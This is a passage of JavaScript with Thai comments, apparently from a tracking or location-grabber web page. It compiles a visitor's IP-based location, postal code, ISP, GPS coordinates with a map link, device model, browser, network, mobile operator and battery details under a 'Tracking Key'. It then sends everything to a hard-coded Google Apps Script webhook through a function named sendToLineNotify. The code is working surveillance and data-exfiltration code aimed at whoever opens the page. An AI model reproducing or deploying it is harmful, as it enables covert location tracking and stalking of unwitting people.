  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
